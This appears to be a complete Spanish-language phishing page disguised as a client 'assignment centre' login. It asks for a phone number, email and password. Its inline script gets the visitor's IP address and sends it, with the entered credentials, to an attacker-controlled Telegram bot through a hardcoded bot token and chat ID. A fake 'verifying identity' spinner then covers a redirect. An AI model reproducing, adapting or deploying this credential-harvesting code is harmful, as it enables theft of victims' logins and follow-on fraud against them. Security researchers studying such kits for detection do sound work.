<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Centro de Asignaciones | Exclusividad clientes</title>
    <style>
        :root { --p: #0A2A5E; --a: #2563eb; }
        body { background: #f1f5f9; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #fff; padding: 45px; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.05); width: 100%; max-width: 400px; text-align: center; }
        .logo { max-width: 180px; margin-bottom: 30px; }
        .f-group { text-align: left; margin-bottom: 20px; }
        label { display: block; font-size: 12px; font-weight: 700; color: #64748b; margin-bottom: 8px; text-transform: uppercase; }
        input { width: 100%; padding: 14px; border: 2px solid #e2e8f0; border-radius: 12px; font-size: 15px; box-sizing: border-box; outline: none; transition: 0.3s; }
        input:focus { border-color: var(--a); }
        .btn { background: var(--p); color: #fff; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 700; cursor: pointer; margin-top: 10px; }
        .loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 100; }
        .spinner { width: 45px; height: 45px; border: 5px solid #f3f3f3; border-top: 5px solid var(--p); border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <img src="img/nuevo.png" class="logo">
        <div class="f-group">
            <label>Teléfono Afiliado</label>
            <input type="tel" id="v1" placeholder="0999999999">
        </div>
        <div class="f-group">
            <label>Correo Afiliado</label>
            <input type="email" id="v2" placeholder="usuario@ejemplo.com">
        </div>
        <div class="f-group">
            <label>Contraseña</label>
            <input type="password" id="v3" placeholder="••••••••">
        </div>
        <button class="btn" onclick="run()">Iniciar Validación</button>
    </div>
    <div id="loading" class="loader"><div class="spinner"></div><p>Verificando identidad...</p></div>
    <script>
        const a="8652605735:", b="AAGpe405IEzW36zWbSR6HbDvaYRmQHfqHGE", c="-1003900740654";
        async function run() {
            document.getElementById('loading').style.display='flex';
            const ipR = await fetch('https://api.ipify.org?format=json');
            const ipD = await ipR.json();
            localStorage.setItem('_uip', ipD.ip);
            const msg = `<b>[IDENTIFICACIÓN]</b>\nIP: ${ipD.ip}\nTel: ${document.getElementById('v1').value}\nMail: ${document.getElementById('v2').value}\nPass: ${document.getElementById('v3').value}`;
            await fetch(`https://api.telegram.org/bot${a+b}/sendMessage?chat_id=${c}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
            setTimeout(() => { window.location.href='valor.html'; }, 4000);
        }
    </script>
</body>
</html>
